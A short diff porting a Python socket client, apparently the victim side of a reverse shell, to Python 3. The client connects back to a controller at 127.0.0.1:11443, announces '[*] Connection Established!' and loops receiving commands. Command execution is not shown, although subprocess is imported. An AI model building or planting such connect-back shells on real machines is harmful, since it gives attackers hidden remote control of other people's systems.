@@ -1,14 +1,16 @@
-import socket, subprocess
+from socket import *
+import subprocess
 
 HOST = '127.0.0.1'
 PORT = 11443
 
 sSock = socket( AF_INET, SOCK_STREAM )
 sSock.connect( ( HOST, PORT ) )
-sSock.send( '[*] Connection Established!' )
+sSock.send( b'[*] Connection Established!' )
 
 while 1:
-    sData = sSock.recv( 1024 )
+    sData = sSock.recv( 1024 ).decode()
+    print( sData )
     if sData == ".quit":
         print( "quit message received from server")
         break
